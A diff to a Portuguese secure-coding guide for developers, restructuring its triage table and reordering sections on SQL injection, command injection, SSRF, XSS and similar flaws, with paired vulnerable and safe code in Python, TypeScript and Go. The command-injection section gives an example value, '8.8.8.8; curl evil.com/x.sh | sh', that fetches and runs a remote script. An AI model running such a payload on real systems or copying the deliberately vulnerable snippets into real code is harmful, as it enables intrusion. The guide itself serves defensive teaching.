@@ -29,32 +29,155 @@ O documento cresce: novas falhas entram seguindo o mesmo formato.
 
 Não é preciso ler o guia inteiro. Ache abaixo a linha que descreve o que o seu código está fazendo, faça a checagem rápida e, se ficou em dúvida, abra só a seção indicada. Se nenhuma linha bate com o que você está escrevendo, provavelmente não tem entrada externa envolvida e o risco é baixo.
 
-| Seu código faz isso                                              | Falha provável                  | Checagem rápida                                                                    | Seção                             |
-| ---------------------------------------------------------------- | ------------------------------- | ---------------------------------------------------------------------------------- | --------------------------------- |
-| Recebe qualquer dado de request, header, cookie, fila ou webhook | Entrada sem contrato            | Existe schema (Pydantic, zod, struct) que rejeita campo desconhecido?              | [Validação de entrada](#validação-de-entrada-a-base-de-tudo)              |
-| Monta uma query SQL usando valor que veio de request             | SQL Injection                   | O valor entra por placeholder (`?` ou `%s`) e não por string?                      | [SQL Injection](#sql-injection)                     |
-| Deixa o usuário escolher coluna, tabela ou ordem do resultado    | SQL Injection                   | O valor recebido é comparado com uma lista fixa no código?                         | [SQL Injection](#sql-injection)                     |
-| Abre, lê, grava ou envia um arquivo cujo nome veio de fora       | Path Traversal                  | O caminho final é resolvido e conferido contra a pasta base?                       | [Path Traversal](#path-traversal)                    |
-| Recebe upload                                                    | Path Traversal                  | O arquivo é gravado com nome gerado pela aplicação, fora da raiz web?              | [Path Traversal](#path-traversal)                    |
-| Cria rota, endpoint ou handler novo                              | Rota sem auth                   | A rota está coberta pelo middleware global, ou está na lista pública de propósito? | [Rota sem autenticação](#rota-sem-autenticação)             |
-| Escreve serviço interno que outro serviço chama                  | Rota sem auth                   | Ele exige credencial de serviço mesmo sem porta publicada?                         | [Rota sem autenticação](#rota-sem-autenticação), [Containers](#falhas-de-serviços-em-containers) |
-| Busca, altera ou apaga um registro por id                        | IDOR                            | A query filtra também por `owner_id` ou `org_id` do usuário logado?                | [IDOR](#idor-insecure-direct-object-reference)                              |
-| Recebe JSON e grava direto no banco (create ou update)           | IDOR (mass assignment)          | Existe schema com só os campos que o usuário pode enviar?                          | [IDOR](#idor-insecure-direct-object-reference)                              |
-| Chama um binário, script ou comando do sistema                   | Command Injection               | Argumentos em lista, regex fechada, `timeout`, sem `shell=True`?                   | [Command Injection](#command-injection)                 |
-| Faz requisição HTTP para URL que veio do usuário                 | SSRF                            | Host em allowlist, ou esquema e IP validados e redirect desligado?                 | [SSRF](#ssrf-server-side-request-forgery)                              |
-| Renderiza HTML, markdown ou texto rico vindo do usuário no React | XSS                             | Passou por DOMPurify antes do `dangerouslySetInnerHTML`?                           | [XSS no front](#xss-no-front-react)                      |
-| Coloca URL vinda do usuário em `href`, `src` ou redirect         | XSS                             | O esquema foi validado como `http` ou `https`?                                     | [XSS no front](#xss-no-front-react)                      |
-| Monta HTML ou e-mail em Go com template                          | XSS                             | É `html/template` e não `text/template`?                                           | [XSS no front](#xss-no-front-react)                      |
-| Escreve ou altera Dockerfile ou compose                          | Container mal configurado       | Tem `USER` não root, sem segredo na imagem, `ports:` só no que é público?          | [Containers](#falhas-de-serviços-em-containers)                        |
-| Precisa de senha, chave ou token dentro da aplicação             | Segredo exposto                 | Vem de variável de ambiente ou secret, e não do código ou da imagem?               | [Segredos e configuração](#segredos-configuração-e-dependências)           |
-| Trata erro ou exceção que volta para o cliente                   | Erro verboso                    | O cliente recebe mensagem genérica e o detalhe fica só no log?                     | [Segredos e configuração](#segredos-configuração-e-dependências)           |
-| Grava ou confere senha de usuário                                | Hash fraco                      | Usa bcrypt ou argon2 da biblioteca padrão?                                         | [Segredos e configuração](#segredos-configuração-e-dependências)           |
-| Adiciona ou atualiza dependência                                 | Pacote vulnerável               | Lockfile atualizado e audit do CI sem severidade alta?                             | [Segredos e configuração](#segredos-configuração-e-dependências)           |
-| Escreve log                                                      | Vazamento em log                | O log não grava senha, token, cookie ou documento?                                 | [Segredos e configuração](#segredos-configuração-e-dependências)           |
+<table>
+<thead>
+<tr>
+<th>Seu código faz isso</th>
+<th>Falha provável</th>
+<th>Checagem rápida</th>
+<th>Seção</th>
+</tr>
+</thead>
+<tbody>
+
+<tr><th colspan="4" align="left">Recebe dado e processa</th></tr>
+
+<tr>
+<td>Recebe qualquer dado de request, header, cookie, fila ou webhook</td>
+<td>Entrada sem contrato</td>
+<td>Existe schema (Pydantic, zod, struct) que rejeita campo desconhecido?</td>
+<td><a href="#validação-de-entrada-a-base-de-tudo">Validação de entrada</a></td>
+</tr>
+<tr>
+<td>Monta uma query SQL usando valor que veio de request</td>
+<td>SQL Injection</td>
+<td>O valor entra por placeholder (<code>?</code> ou <code>%s</code>) e não por string?</td>
+<td><a href="#sql-injection">SQL Injection</a></td>
+</tr>
+<tr>
+<td>Deixa o usuário escolher coluna, tabela ou ordem do resultado</td>
+<td>SQL Injection</td>
+<td>O valor recebido é comparado com uma lista fixa no código?</td>
+<td><a href="#sql-injection">SQL Injection</a></td>
+</tr>
+<tr>
+<td>Abre, lê, grava ou envia um arquivo cujo nome veio de fora</td>
+<td>Path Traversal</td>
+<td>O caminho final é resolvido e conferido contra a pasta base?</td>
+<td><a href="#path-traversal">Path Traversal</a></td>
+</tr>
+<tr>
+<td>Recebe upload</td>
+<td>Path Traversal</td>
+<td>O arquivo é gravado com nome gerado pela aplicação, fora da raiz web?</td>
+<td><a href="#path-traversal">Path Traversal</a></td>
+</tr>
+<tr>
+<td>Chama um binário, script ou comando do sistema</td>
+<td>Command Injection</td>
+<td>Argumentos em lista, regex fechada, <code>timeout</code>, sem <code>shell=True</code>?</td>
+<td><a href="#command-injection">Command Injection</a></td>
+</tr>
+
+<tr><th colspan="4" align="left">Controla quem acessa o quê</th></tr>
+
+<tr>
+<td>Cria rota, endpoint ou handler novo</td>
+<td>Rota sem auth</td>
+<td>A rota está coberta pelo middleware global, ou está na lista pública de propósito?</td>
+<td><a href="#rota-sem-autenticação">Rota sem autenticação</a></td>
+</tr>
+<tr>
+<td>Escreve serviço interno que outro serviço chama</td>
+<td>Rota sem auth</td>
+<td>Ele exige credencial de serviço mesmo sem porta publicada?</td>
+<td><a href="#rota-sem-autenticação">Rota sem autenticação</a>, <a href="#falhas-de-serviços-em-containers">Containers</a></td>
+</tr>
+<tr>
+<td>Busca, altera ou apaga um registro por id</td>
+<td>IDOR</td>
+<td>A query filtra também por <code>owner_id</code> ou <code>org_id</code> do usuário logado?</td>
+<td><a href="#idor-insecure-direct-object-reference">IDOR</a></td>
+</tr>
+<tr>
+<td>Recebe JSON e grava direto no banco (create ou update)</td>
+<td>IDOR (mass assignment)</td>
+<td>Existe schema com só os campos que o usuário pode enviar?</td>
+<td><a href="#idor-insecure-direct-object-reference">IDOR</a></td>
+</tr>
+
+<tr><th colspan="4" align="left">Requisição de saída e renderização</th></tr>
+
+<tr>
+<td>Faz requisição HTTP para URL que veio do usuário</td>
+<td>SSRF</td>
+<td>Host em allowlist, ou esquema e IP validados e redirect desligado?</td>
+<td><a href="#ssrf-server-side-request-forgery">SSRF</a></td>
+</tr>
+<tr>
+<td>Renderiza HTML, markdown ou texto rico vindo do usuário no React</td>
+<td>XSS</td>
+<td>Passou por DOMPurify antes do <code>dangerouslySetInnerHTML</code>?</td>
+<td><a href="#xss-no-front-react">XSS no front</a></td>
+</tr>
+<tr>
+<td>Coloca URL vinda do usuário em <code>href</code>, <code>src</code> ou redirect</td>
+<td>XSS</td>
+<td>O esquema foi validado como <code>http</code> ou <code>https</code>?</td>
+<td><a href="#xss-no-front-react">XSS no front</a></td>
+</tr>
+<tr>
+<td>Monta HTML ou e-mail em Go com template</td>
+<td>XSS</td>
+<td>É <code>html/template</code> e não <code>text/template</code>?</td>
+<td><a href="#xss-no-front-react">XSS no front</a></td>
+</tr>
+
+<tr><th colspan="4" align="left">Infraestrutura e configuração</th></tr>
+
+<tr>
+<td>Escreve ou altera Dockerfile ou compose</td>
+<td>Container mal configurado</td>
+<td>Tem <code>USER</code> não root, sem segredo na imagem, <code>ports:</code> só no que é público?</td>
+<td><a href="#falhas-de-serviços-em-containers">Containers</a></td>
+</tr>
+<tr>
+<td>Precisa de senha, chave ou token dentro da aplicação</td>
+<td>Segredo exposto</td>
+<td>Vem de variável de ambiente ou secret, e não do código ou da imagem?</td>
+<td><a href="#segredos-configuração-e-dependências">Segredos e configuração</a></td>
+</tr>
+<tr>
+<td>Trata erro ou exceção que volta para o cliente</td>
+<td>Erro verboso</td>
+<td>O cliente recebe mensagem genérica e o detalhe fica só no log?</td>
+<td><a href="#segredos-configuração-e-dependências">Segredos e configuração</a></td>
+</tr>
+<tr>
+<td>Grava ou confere senha de usuário</td>
+<td>Hash fraco</td>
+<td>Usa bcrypt ou argon2 da biblioteca padrão?</td>
+<td><a href="#segredos-configuração-e-dependências">Segredos e configuração</a></td>
+</tr>
+<tr>
+<td>Adiciona ou atualiza dependência</td>
+<td>Pacote vulnerável</td>
+<td>Lockfile atualizado e audit sem severidade alta?</td>
+<td><a href="#segredos-configuração-e-dependências">Segredos e configuração</a></td>
+</tr>
+<tr>
+<td>Escreve log</td>
+<td>Vazamento em log</td>
+<td>O log não grava senha, token, cookie ou documento?</td>
+<td><a href="#segredos-configuração-e-dependências">Segredos e configuração</a></td>
+</tr>
+
+</tbody>
+</table>
 
 **Atalho para quem tem pressa:** siga as três etapas do [fluxo acima](#fluxo-deste-documento). Se quer entender o porquê de cada checagem, use a tabela de falhas para ir direto na seção.
 
-<h2 id="validação-de-entrada-a-base-de-tudo">Validação de entrada: a base de tudo <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
+<h2 id="validação-de-entrada-a-base-de-tudo">Validação de entrada: a base de tudo <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
 
 **O que é:** conferir cada dado que chega de fora antes de usar. Tipo (é número?), formato (é e-mail? é UUID?), tamanho (até 100 caracteres?) e faixa (entre 1 e 1000?). O que não passa é rejeitado com 400, sem tentar "consertar".
 
@@ -137,7 +260,7 @@ if err := validate.Struct(in); err != nil { http.Error(w, "bad request", 400); r
 - String tem tamanho máximo; número tem faixa; enum tem lista fixa.
 - Dado lido do banco e renderizado ou concatenado passa pelo mesmo tratamento que dado de request.
 
-<h2 id="sql-injection">SQL Injection <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
+<h2 id="sql-injection">SQL Injection <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
 
 **O que é:** o dado do usuário vira parte do comando SQL em vez de ser tratado como valor. O atacante altera a lógica da query: lê tabelas que não deveria, ignora autenticação, apaga ou altera registros.
 
@@ -200,7 +323,7 @@ rows, err := db.Query("SELECT * FROM users WHERE email = ?", email)
 - Coluna, tabela e direção de ordenação vindas do usuário passam por lista de valores permitidos.
 - O usuário do banco usado pela aplicação não tem `DROP`, `FILE` ou acesso a outros schemas.
 
-<h2 id="path-traversal">Path Traversal <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
+<h2 id="path-traversal">Path Traversal <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
 
 **O que é:** o usuário controla parte de um caminho de arquivo e usa `../` para sair da pasta prevista. Resultado: leitura de `/etc/passwd`, `.env`, chaves privadas, código-fonte, ou escrita de arquivo em lugar arbitrário (upload que vira shell).
 
@@ -275,7 +398,72 @@ http.ServeFile(w, r, target)
 - Upload grava com nome gerado pela aplicação e extensão validada.
 - Bloqueio por blacklist de `../` sozinho é reprovado.
 
-<h2 id="rota-sem-autenticação">Rota sem autenticação <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
+<h2 id="command-injection">Command Injection <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
+
+**O que é:** dado do usuário vira parte de um comando executado no sistema operacional. É o SQL Injection com o shell no lugar do banco. O atacante encadeia comandos com `;`, `&&`, `|` ou `$( )` e executa o que quiser com o usuário do processo. Resultado direto: RCE, execução remota de código no servidor.
+
+**No dia a dia do dev:** `os.system(f"ping -c 1 {host}")` parece só um ping. Se `host` for `8.8.8.8; curl evil.com/x.sh | sh`, o shell roda o ping e depois roda o resto. Todo lugar onde você chamaria um binário externo (ImageMagick, ffmpeg, git, zip, nmap, um script legado) é candidato.
+
+**Como acontece:** uso de `shell=True`, `exec()` do Node, `os.system`, `sh -c` com string montada. Mesmo sem shell, passar o dado como argumento sem validar permite injeção de flag (`--output=/etc/cron.d/x`).
+
+### Código vulnerável
+
+Python:
+
+```python
+subprocess.run(f"convert {filename} -resize 100x100 thumb.png", shell=True)
+```
+
+TypeScript (Node):
+
+```typescript
+exec(`git clone ${repoUrl} /tmp/repo`, callback);
+```
+
+Go:
+
+```go
+exec.Command("sh", "-c", "tar -czf backup.tgz "+dir).Run()
+```
+
+### Código seguro
+
+Três regras, nesta ordem: (1) não chame o shell, chame o binário com argumentos em lista; (2) valide o argumento contra formato fechado; (3) se existe biblioteca nativa para a tarefa, use ela e não chame binário nenhum.
+
+Python:
+
+```python
+if not re.fullmatch(r"[a-zA-Z0-9_.-]{1,64}", filename):
+    abort(400)
+subprocess.run(["convert", filename, "-resize", "100x100", "thumb.png"], check=True, timeout=30)
+```
+
+TypeScript (Node):
+
+```typescript
+if (!/^https:\/\/github\.com\/[\w.-]+\/[\w.-]+$/.test(repoUrl)) return res.sendStatus(400);
+execFile("git", ["clone", "--", repoUrl, "/tmp/repo"], callback);
+```
+
+Go:
+
+```go
+if !validDir.MatchString(dir) { http.Error(w, "bad request", 400); return }
+exec.Command("tar", "-czf", "backup.tgz", "--", dir).Run()
+```
+
+O `--` antes do argumento impede que um valor começando com `-` seja lido como flag.
+
+**Cuidados extras:** `timeout` em toda chamada externa; rodar o binário com usuário sem privilégio; nunca passar dado externo para `eval`, `exec` (Python), `Function`, `vm.runInNewContext` (Node) ou `template.Must(template.New().Parse(dado))` (Go).
+
+### O que validar na revisão
+
+- Nenhum `shell=True`, `exec()` com string, `sh -c` ou `os.system` com dado externo.
+- Argumento passa por regex fechada antes de chegar ao binário.
+- Chamada externa tem `timeout`.
+- Se existe lib nativa (Pillow, sharp, archive/zip), o binário não é chamado.
+
+<h2 id="rota-sem-autenticação">Rota sem autenticação <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
 
 **O que é:** um endpoint que deveria exigir login responde para qualquer requisição. O front esconde o botão, mas a API está aberta. Quem chama a URL direto (curl, Burp, script) recebe o dado ou executa a ação.
 
@@ -348,7 +536,7 @@ http.ListenAndServe(":8080", handler)
 - Nenhuma rota de debug, admin ou interna exposta no mesmo listener da API pública.
 - Serviço interno exige credencial de serviço mesmo dentro da rede.
 
-<h2 id="idor-insecure-direct-object-reference">IDOR (Insecure Direct Object Reference) <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
+<h2 id="idor-insecure-direct-object-reference">IDOR (Insecure Direct Object Reference) <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
 
 **O que é:** o usuário está logado, mas troca o id na URL ou no body e acessa um objeto que não é dele. `GET /api/invoices/1042` vira `GET /api/invoices/1043` e devolve a fatura de outro cliente. É o erro de autorização mais comum em API e o mais fácil de explorar: não precisa de ferramenta, só de mudar um número.
 
@@ -422,72 +610,7 @@ row := db.QueryRow("SELECT * FROM invoices WHERE id = ? AND owner_id = ?", id, u
 - Update usa schema de campos permitidos; `role`, `status` de pagamento e similares não entram.
 - Existe teste que acessa o objeto de outro usuário e espera 404.
 
-<h2 id="command-injection">Command Injection <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
-
-**O que é:** dado do usuário vira parte de um comando executado no sistema operacional. É o SQL Injection com o shell no lugar do banco. O atacante encadeia comandos com `;`, `&&`, `|` ou `$( )` e executa o que quiser com o usuário do processo. Resultado direto: RCE, execução remota de código no servidor.
-
-**No dia a dia do dev:** `os.system(f"ping -c 1 {host}")` parece só um ping. Se `host` for `8.8.8.8; curl evil.com/x.sh | sh`, o shell roda o ping e depois roda o resto. Todo lugar onde você chamaria um binário externo (ImageMagick, ffmpeg, git, zip, nmap, um script legado) é candidato.
-
-**Como acontece:** uso de `shell=True`, `exec()` do Node, `os.system`, `sh -c` com string montada. Mesmo sem shell, passar o dado como argumento sem validar permite injeção de flag (`--output=/etc/cron.d/x`).
-
-### Código vulnerável
-
-Python:
-
-```python
-subprocess.run(f"convert {filename} -resize 100x100 thumb.png", shell=True)
-```
-
-TypeScript (Node):
-
-```typescript
-exec(`git clone ${repoUrl} /tmp/repo`, callback);
-```
-
-Go:
-
-```go
-exec.Command("sh", "-c", "tar -czf backup.tgz "+dir).Run()
-```
-
-### Código seguro
-
-Três regras, nesta ordem: (1) não chame o shell, chame o binário com argumentos em lista; (2) valide o argumento contra formato fechado; (3) se existe biblioteca nativa para a tarefa, use ela e não chame binário nenhum.
-
-Python:
-
-```python
-if not re.fullmatch(r"[a-zA-Z0-9_.-]{1,64}", filename):
-    abort(400)
-subprocess.run(["convert", filename, "-resize", "100x100", "thumb.png"], check=True, timeout=30)
-```
-
-TypeScript (Node):
-
-```typescript
-if (!/^https:\/\/github\.com\/[\w.-]+\/[\w.-]+$/.test(repoUrl)) return res.sendStatus(400);
-execFile("git", ["clone", "--", repoUrl, "/tmp/repo"], callback);
-```
-
-Go:
-
-```go
-if !validDir.MatchString(dir) { http.Error(w, "bad request", 400); return }
-exec.Command("tar", "-czf", "backup.tgz", "--", dir).Run()
-```
-
-O `--` antes do argumento impede que um valor começando com `-` seja lido como flag.
-
-**Cuidados extras:** `timeout` em toda chamada externa; rodar o binário com usuário sem privilégio; nunca passar dado externo para `eval`, `exec` (Python), `Function`, `vm.runInNewContext` (Node) ou `template.Must(template.New().Parse(dado))` (Go).
-
-### O que validar na revisão
-
-- Nenhum `shell=True`, `exec()` com string, `sh -c` ou `os.system` com dado externo.
-- Argumento passa por regex fechada antes de chegar ao binário.
-- Chamada externa tem `timeout`.
-- Se existe lib nativa (Pillow, sharp, archive/zip), o binário não é chamado.
-
-<h2 id="ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery) <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
+<h2 id="ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery) <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
 
 **O que é:** o servidor faz uma requisição HTTP para uma URL que o usuário escolheu. O atacante aponta para endereços que só o servidor alcança: serviços internos (`http://db-admin:8080`), o próprio serviço Go interno sem auth, o endpoint de metadata da nuvem (`http://169.254.169.254/`, que entrega credenciais da instância) ou `localhost`.
 
@@ -589,7 +712,7 @@ func safeGet(raw string) (*http.Response, error) {
 - Timeout e limite de tamanho de resposta definidos.
 - Rede do container não alcança metadata da nuvem nem serviços que a feature não usa.
 
-<h2 id="xss-no-front-react">XSS no front (React) <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
+<h2 id="xss-no-front-react">XSS no front (React) <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
 
 **O que é:** dado de usuário renderizado como HTML ou JavaScript no navegador de outra pessoa. O atacante rouba sessão, faz requisições em nome da vítima ou altera a página.
 
@@ -642,7 +765,7 @@ const safeUrl = (u: string) => /^https?:\/\//i.test(u) ? u : "#";
 - Nenhum uso de `innerHTML`, `eval` ou `new Function` com dado externo.
 - CSP configurada no backend; sessão em cookie `HttpOnly`.
 
-<h2 id="falhas-de-serviços-em-containers">Falhas de serviços em containers <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
+<h2 id="falhas-de-serviços-em-containers">Falhas de serviços em containers <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
 
 **O que é:** o código pode estar correto e o serviço ainda ser comprometido pela forma como roda. Container mal configurado transforma uma falha pequena na aplicação (RCE, path traversal, SSRF) em acesso ao host ou a outros serviços.
 
@@ -720,7 +843,7 @@ networks:
 - Imagem base fixada em versão suportada e escaneada no CI.
 - Serviço interno Go exige credencial mesmo sem porta publicada.
 
-<h2 id="segredos-configuração-e-dependências">Segredos, configuração e dependências <sup><a href="#por-onde-começar-mapa-por-trecho-de-código">voltar à tabela</a></sup></h2>
+<h2 id="segredos-configuração-e-dependências">Segredos, configuração e dependências <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela">↑</a></h2>
 
 Três problemas que não aparecem no código da feature, mas aparecem em quase todo incidente.
 
@@ -742,7 +865,7 @@ Três problemas que não aparecem no código da feature, mas aparecem em quase t
 
 As seções acima cobrem as falhas no código. Daqui em diante o foco é o que verificar antes de abrir o Pull Request: se a aplicação registra os eventos certos para auditoria, as verificações práticas que você pode rodar, a régua de severidade e o checklist final.
 
-<h2 id="log-de-segurança">Log de segurança: o que registrar e por quê <sup><a href="#fluxo-deste-documento">voltar ao fluxo</a></sup></h2>
+<h2 id="log-de-segurança">Log de segurança: o que registrar e por quê <a href="#fluxo-deste-documento" title="Voltar ao fluxo">↑</a></h2>
 
 Tudo acima reduz a chance de exploração. Nada acima permite descobrir que alguém tentou. Isso é o log.
 
@@ -786,7 +909,7 @@ JSON, uma linha por evento, `event` com nome fixo em `dominio.acao` (`auth.login
 - `request_id` é gerado na entrada e propagado para chamadas internas.
 - Nenhum campo sensível no log.
 
-<h2 id="verificações-e-ferramentas">Verificações e ferramentas <sup><a href="#fluxo-deste-documento">voltar ao fluxo</a></sup></h2>
+<h2 id="verificações-e-ferramentas">Verificações e ferramentas <a href="#fluxo-deste-documento" title="Voltar ao fluxo">↑</a></h2>
 
 Depois de validar o código contra as seções de falha e garantir o log, estas verificações ajudam a confirmar o comportamento antes de abrir o Pull Request.
 
@@ -940,7 +1063,7 @@ Quando uma ferramenta encontrar algo, a seção correspondente deste guia explic
 - Pipeline verde inclui SAST, audit de dependência e scan de imagem.
 - Supressão de alerta tem justificativa ao lado.
 
-<h2 id="severidade">Severidade <sup><a href="#fluxo-deste-documento">voltar ao fluxo</a></sup></h2>
+<h2 id="severidade">Severidade <a href="#fluxo-deste-documento" title="Voltar ao fluxo">↑</a></h2>
 
 Nem toda falha tem o mesmo peso. A escala abaixo é a régua para a equipe de segurança classificar o que for reportado, e para o dev ter visibilidade do impacto.
 
@@ -957,7 +1080,7 @@ A tabela classifica o risco do padrão isolado. Quando a engenharia por trás de
 
 **Exceção precisa de justificativa escrita.** Se um ponto do checklist não pode ser atendido (raw SQL por performance, `shell=True` em script legado), o Pull Request descreve o motivo, qual controle compensa (allowlist, isolamento, timeout) e quem aprovou. Sem isso, o revisor reprova.
 
-<h2 id="checklist-de-revisão-de-código">Checklist de revisão de código <sup><a href="#fluxo-deste-documento">voltar ao fluxo</a></sup></h2>
+<h2 id="checklist-de-revisão-de-código">Checklist de revisão de código <a href="#fluxo-deste-documento" title="Voltar ao fluxo">↑</a></h2>
 
 Perguntas objetivas para o revisor. Uma resposta "não" exige correção ou justificativa no Pull Request.
 
